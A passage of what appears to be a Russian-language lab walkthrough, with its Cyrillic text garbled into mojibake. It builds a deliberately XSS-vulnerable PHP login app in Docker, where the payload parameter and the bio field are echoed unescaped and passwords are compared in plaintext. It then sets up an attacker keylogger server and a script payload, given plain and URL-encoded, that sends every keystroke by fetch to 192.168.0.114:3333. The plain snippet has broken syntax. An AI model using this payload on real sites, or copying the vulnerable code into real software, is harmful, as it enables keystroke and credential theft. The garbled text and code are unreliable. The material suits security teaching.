    <h1>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h1>
    <form method="POST">
        <label>–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</label><br>
        <input type="text" name="username" required><br><br>

        <label>–ü–∞—Ä–æ–ª—å:</label><br>
        <input type="password" name="password" required><br><br>
        
        <label>–û —Å–µ–±–µ (bio):</label><br>
        <textarea name="bio" rows="4" cols="50" placeholder="–†–∞—Å—Å–∫–∞–∂–∏ –æ —Å–µ–±–µ"></textarea><br><br>
        
        <input type="submit" value="–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è">
    </form>
    <p>–£–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã? <a href="login.php">–í–æ–π—Ç–∏</a></p>
</body>
</html>
```

### `html/login.php`

```php
<?php
session_start();
require 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username = :username";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':username', $username);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // ‚ö†Ô∏è –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–æ: —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å –æ—Ç–∫—Ä—ã—Ç—ã–º —Ç–µ–∫—Å—Ç–æ–º
    if ($user && $user['password'] === $password) {
        $_SESSION['username'] = $username;
        header("Location: dashboard.php");
        exit();
    } else {
        $error = "–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å";
    }
}

// ‚ö†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç—å XSS: –≤—ã–≤–æ–¥ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
if (isset($_GET['payload'])) {
    echo $_GET['payload'];
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–í—Ö–æ–¥</title>
</head>
<body>
    <h1>–í—Ö–æ–¥</h1>
    <?php if(isset($error)) { echo "<p style='color:red;'>" . $error . "</p>"; } ?>
    <form method="POST">
        <label>–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</label><br>
        <input type="text" name="username" required><br><br>
        
        <label>–ü–∞—Ä–æ–ª—å:</label><br>
        <input type="password" name="password" required><br><br>
        
        <input type="submit" value="–í–æ–π—Ç–∏">
    </form>
    <p>–ù–µ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞? <a href="register.php">–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è</a></p>
</body>
</html>
```

### `html/dashboard.php`

```php
<?php
session_start();
require 'db.php';

if (!isset($_SESSION['username'])) {
    header("Location: login.php");
    exit();
}

$username = $_SESSION['username'];

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ bio
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newBio = $_POST['bio'] ?? '';
    $sql = "UPDATE users SET bio = :bio WHERE username = :username";
    $stmt = $pdo->prepare($sql);
    $stmt->bindValue(':bio', $newBio);
    $stmt->bindValue(':username', $username);
    $stmt->execute();
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –ø—Ä–æ—Ñ–∏–ª—è
$sql = "SELECT * FROM users WHERE username = :username";
$stmt = $pdo->prepare($sql);
$stmt->bindValue(':username', $username);
$stmt->execute();
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    header("Location: login.php");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç</title>
</head>
<body>
    <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, <?php echo htmlspecialchars($user['username']); ?>!</h1>

    <?php
    // ‚ö†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç—å XSS: –≤—ã–≤–æ–¥ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
    if (isset($_GET['payload'])) {
        echo $_GET['payload'];
    }
    ?>

    <p><strong>–û —Å–µ–±–µ (bio):</strong> <?php echo $user['bio']; ?></p>

    <h2>–†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å ¬´–û —Å–µ–±–µ¬ª</h2>
    <form method="POST">
        <textarea name="bio" rows="4" cols="50"><?php echo $user['bio']; ?></textarea><br>
        <input type="submit" value="–°–æ—Ö—Ä–∞–Ω–∏—Ç—å">
    </form>

    <p><a href="logout.php">–í—ã–π—Ç–∏</a></p>
</body>
</html>
```

### `html/logout.php`

```php
<?php
session_start();
session_destroy();
header("Location: index.php");
exit();
```

---

## üóÉ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ë–î (—á–µ—Ä–µ–∑ pgAdmin –∏–ª–∏ psql)

**–°—Ö–µ–º–∞ –∏ —Ç–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:**

```sql
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(64) UNIQUE NOT NULL,
  password VARCHAR(255) NOT NULL,
  bio TEXT DEFAULT ''
);
```
## –í —Ä–∞–º–∫–∞—Ö –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –ø–∞—Ä–æ–ª–∏ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ, –æ—á–µ–≤–∏–¥–Ω–æ, —á—Ç–æ —Ç–∞–∫ –Ω–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å, –¥–æ–ø—É—Å—Ç–∏–º, —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è

**–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —Å —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ–º –ø–∞—Ä–æ–ª—è**
```
// –ü–æ–ª—É—á–∞–µ–º –ø–∞—Ä–æ–ª—å –∏–∑ —Ñ–æ—Ä–º—ã
$password = $_POST['password'];

// –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ö—ç—à —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞–ª–≥–æ—Ä–∏—Ç–º–∞ bcrypt
$passwordHash = password_hash($password, PASSWORD_BCRYPT);

// –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –ë–î
$sql = "INSERT INTO users (username, password_hash, bio) VALUES (:username, :password_hash, :bio)";
$stmt = $pdo->prepare($sql);
$stmt->bindValue(':username', $username);
$stmt->bindValue(':password_hash', $passwordHash);
$stmt->bindValue(':bio', $bio);
$stmt->execute();

```
**–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –ø–∞—Ä–æ–ª—è**
```
$sql = "SELECT * FROM users WHERE username = :username";
$stmt = $pdo->prepare($sql);
$stmt->bindValue(':username', $username);
$stmt->execute();
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user && password_verify($password, $user['password_hash'])) {
    $_SESSION['username'] = $username;
    header("Location: dashboard.php");
    exit();
} else {
    $error = "–ù–µ–≤–µ—Ä–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—å";
}
```
**–¢–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –±–µ–∑–æ–ø–∞—Å–Ω—ã–º —Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –ø–∞—Ä–æ–ª—è**
```
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(64) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  bio TEXT DEFAULT ''
);
```

> –ß–µ—Ä–µ–∑ **pgAdmin** –ø–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –∫ —Ö–æ—Å—Ç—É `db:5432` (–∏–∑–Ω—É—Ç—Ä–∏ —Å–µ—Ç–∏ Docker) –∏–ª–∏ –∫ `localhost:1111` PgAdmin4 —á–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä. –ü–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –ë–î `anubis`, –∑–∞—Ç–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç–µ SQL –¥–ª—è —Ç–∞–±–ª–∏—Ü—ã `users`.

---

## ‚ñ∂Ô∏è –ó–∞–ø—É—Å–∫ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∞

1. –°–æ–±—Ä–∞—Ç—å –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã:

   ```bash
   docker compose up -d --build
   ```
2. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ –≤ —Ä–µ–∂–∏–º–µ CLI
```bash
root@dock:~# docker ps -a
CONTAINER ID   IMAGE                   COMMAND                  CREATED          STATUS          PORTS
                            NAMES
404652693b31   dpage/pgadmin4:latest   "/entrypoint.sh"         42 minutes ago   Up 42 minutes   443/tcp, 0.0.0.0:1111->80/tcp, [::]:1111->80/tcp   pgadmin
312c834e57dc   test-xss-php            "docker-php-entrypoi‚Ä¶"   42 minutes ago   Up 42 minutes   0.0.0.0:2222->80/tcp, [::]:2222->80/tcp            test-xss-php-1
4e5491887cbc   postgres:latest         "docker-entrypoint.s‚Ä¶"   42 minutes ago   Up 42 minutes   0.0.0.0:5432->5432/tcp, [::]:5432->5432/tcp        postgres_db
root@dock:~#
```
3. –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Å–µ—Ä–≤–∏—Å–æ–≤:

   * –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ: `http://<ip>:2222`
   * pgAdmin: `http://<ip>:1111`
4. –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å —Ç–µ—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –≤–æ–π—Ç–∏ –≤ **–õ–ö**.
5. –£–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –ø–∞—Ä–∞–º–µ—Ç—Ä `payload` –æ—Ç—Ä–∏—Å–æ–≤—ã–≤–∞–µ—Ç—Å—è *–∫–∞–∫ –µ—Å—Ç—å*, –Ω–∞–ø—Ä–∏–º–µ—Ä:

   ```
   http://<ip>:2222/login.php?payload=<script>alert('xss')</script>
   ```

### üõ† –≠—Ç–∞–ø 2 ‚Äî –°–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞: –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è —Å–±–æ—Ä–∞ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à

–ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ: –ø—Ä–∏–Ω—è—Ç—å `POST` –æ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ JS –∏ –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à –≤ `keylog.txt`.

#### üì¶ Docker Compose (–º–∞—à–∏–Ω–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞)
```yaml
version: '3.8'

services:
  keylogger:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: keylogger_server
    ports:
      - "3333:80"
    # (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ) —Å–æ—Ö—Ä–∞–Ω—è–µ–º –ª–æ–≥–∏ –Ω–∞ —Ö–æ—Å—Ç–µ:
    # volumes:
    #   - ./logs:/var/www/html
```
üß± Dockerfile
```
FROM php:8.1-apache

# –ö–æ–ø–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫
COPY keylogger.php /var/www/html/keylogger.php

# –ü—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å—å –¥–ª—è —Ñ–∞–π–ª–∞ –ª–æ–≥–æ–≤
RUN chown -R www-data:www-data /var/www/html
```

üóÉ keylogger.php

```
<?php // keylogger.php ‚Äî —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à 
if ($_SERVER['REQUEST_METHOD'] == 'POST') { 
  $key = isset($_POST['key']) ? $_POST['key'] : ''; 
  $log_entry = "Key: " . $key . " at " . date("Y-m-d H:i:s") . "\n";
  file_put_contents('keylog.txt', $log_entry, FILE_APPEND);
}
?>
```

keylogger.php ‚Äì —ç—Ç–æ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π PHP-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–π –Ω–∞ –º–∞—à–∏–Ω–µ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞. –°–∫—Ä–∏–ø—Ç –ø—Ä–∏–Ω–∏–º–∞–µ—Ç HTTP-–∑–∞–ø—Ä–æ—Å—ã –º–µ—Ç–æ–¥–æ–º POST —Å –ø–æ–ª–µ–º key, —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç —Å—Ç—Ä–æ–∫—É –∂—É—Ä–Ω–∞–ª–∞ –≤–∏–¥–∞ Key: <—Å–∏–º–≤–æ–ª> at <YYYY-MM-DD HH:MM:SS> –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –µ—ë –≤ —Ñ–∞–π–ª keylog.txt, —Ñ–∞–π–ª —Å–æ–∑–¥–∞—ë—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏ –ø–µ—Ä–≤–æ–º –æ–±—Ä–∞—â–µ–Ω–∏–∏. –¢–µ–º —Å–∞–º—ã–º –∫–∞–∂–¥–æ–µ –Ω–∞–∂–∞—Ç–∏–µ –∫–ª–∞–≤–∏—à–∏, –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–æ–µ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∫–ª–∏–µ–Ω—Ç–∞, –º–≥–Ω–æ–≤–µ–Ω–Ω–æ —Ñ–∏–∫—Å–∏—Ä—É–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–æ –ø–æ–∑–¥–Ω–µ–µ.

–§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ URL —Å–∫—Ä–∏–ø—Ç–∞
```
<script>
document.onkeypress = function (e) { 
    var key = e.key
    console.log("–ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞: " + key
    fetch("http://192.168.0.114:3333/keylogger.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "key=" + encodeURIComponent(key
    });
};
</script>
```
document.onkeypress ‚Äì —ç—Ç–æ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä –Ω–∞–∑–Ω–∞—á–∞–µ—Ç –≥–ª–æ–±–∞–ª—å–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–±—ã—Ç–∏—è –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à–∏, –±–ª–∞–≥–æ–¥–∞—Ä—è —á–µ–º—É —Å–∫—Ä–∏–ø—Ç —Ä–µ–∞–≥–∏—Ä—É–µ—Ç –Ω–∞ –∫–∞–∂–¥–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ. –í —Ç–µ–ª–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ –æ–ø–µ—Ä–∞—Ç–æ—Ä var key = e.key –∏–∑–≤–ª–µ–∫–∞–µ—Ç –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ —Å–∏–º–≤–æ–ª, –≤–≤–µ–¥—ë–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, —á—Ç–æ –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç —Ç–æ—á–Ω–æ—Å—Ç—å —Å–æ–±–∏—Ä–∞–µ–º—ã—Ö –¥–∞–Ω–Ω—ã—Ö –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –ª–æ–≥–∏–∫–∏. –í —Å—Ç—Ä–æ–∫–µ console.log ("–ù–∞–∂–∞—Ç–∞ –∫–ª–∞–≤–∏—à–∞:" + key) –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç—Å—è –≤—ã–≤–æ–¥ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ –∫–æ–Ω—Å–æ–ª—å –±—Ä–∞—É–∑–µ—Ä–∞, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç—å —Ä–∞–±–æ—Ç—ã –∫–µ–π–ª–æ–≥–≥–µ—Ä–∞ –Ω–∞ —ç—Ç–∞–ø–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –±–µ–∑ –≤–∏–∑—É–∞–ª—å–Ω–æ–≥–æ –≤–º–µ—à–∞—Ç–µ–ª—å—Å—Ç–≤–∞ –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –¥–∞–Ω–Ω—ã—Ö —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏—é fetch, –∫–æ—Ç–æ—Ä–∞—è —Ñ–æ—Ä–º–∏—Ä—É–µ—Ç –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç HTTP POST-–∑–∞–ø—Ä–æ—Å –∫ —Å–µ—Ä–≤–µ—Ä–Ω–æ–º—É –ø—Ä–∏—ë–º–Ω–∏–∫—É keylogger.php, –ø–µ—Ä–µ–¥–∞–≤–∞—è –ø–∞—Ä–∞–º–µ—Ç—Ä key –≤ —Ñ–æ—Ä–º–∞—Ç–µ application/x-www-form-urlencoded. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–≥–æ –∞–Ω–∞–ª–∏–∑–∞ –∏ —Ö—Ä–∞–Ω–µ–Ω–∏—è –≤ –ª–æ–≥-—Ñ–∞–π–ª–µ.
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –ø–æ —ç—Ç–æ–π —Å—Å—ã–ª–∫–µ, —á—Ç–æ–±—ã –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π JavaScript –∏—Å–ø–æ–ª–Ω–∏–ª—Å—è –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ dashboard.php, –∞ –≤—Å–µ –Ω–∞–∂–∞—Ç–∏—è –∫–ª–∞–≤–∏—à –Ω–∞—á–∞–ª–∏ —É—Ö–æ–¥–∏—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞

–§—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–π URL

```
http://192.168.0.69:2222/dashboard.php?payload=%3Cscript%3Edocument.onkeypress%3Dfunction(e)%7Bvar%20key%3De.key%3Bconsole.log(%22%D0%9D%D0%B0%D0%B6%D0%B0%D1%82%D0%B0%20%D0%BA%D0%BB%D0%B0%D0%B2%D0%B8%D1%88%D0%B0%3A%20%22%20%2Bkey)%3Bfetch(%27http%3A%2F%2F192.168.0.114%3A3333%2Fkeylogger.php%27%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3A%27key%3D%27%2BencodeURIComponent(key)%7D)%3B%7D%3B%3C%2Fscript%3E
```

### üé• –í–∏–¥–µ–æ-–¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –∞—Ç–∞–∫–∏
[–°–º–æ—Ç—Ä–µ—Ç—å –≤–∏–¥–µ–æ –≤ Google Drive](https://drive.google.com/file/d/1A0Uh9WIpx9KFe4nZnPX7zDC-92cl0SQB/view?usp=sharing)

### –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è –Ω–∞—á–Ω—É –¥–æ–ø–∏—Å—ã–≤–∞—Ç—å –µ—â–µ –æ—Å—Ç–∞–≤—à–∏–µ—Å—è –∞—Ç–∞–∫–∏...
